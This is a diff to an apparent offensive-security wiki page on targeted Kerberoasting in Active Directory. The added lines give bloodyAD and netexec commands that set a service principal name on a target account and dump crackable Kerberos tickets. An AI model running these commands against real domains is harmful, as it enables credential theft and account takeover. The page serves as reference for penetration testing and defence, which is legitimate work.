@@ -9,7 +9,18 @@ The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the a
 From UNIX-like systems, this can be done with [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) (Python)
 
 ```bash
-targetedKerberoast.py -v -d $DOMAIN_FQDN -u $USER -p $PASSWORD
+targetedKerberoast.py -v -d "$DC_HOST" -u "$USER" -p "$PASSWORD"
+```
+
+***
+
+**Alternative 1:** Using [bloodyAD](https://github.com/CravateRouge/bloodyAD) and [netexec](https://github.com/Pennyw0rth/NetExec)
+
+```bash
+# Add a SPN to attribute to the targeted account
+bloodyAD -d "$DOMAIN" --host "$DC_HOST" -u "$USER" -p "$PASSWORD" set object "$TARGET" servicePrincipalName -v 'http/anything'
+
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -H "$NThash" --kerberoasting kerberoastables.txt
 ```
 {% endtab %}
 
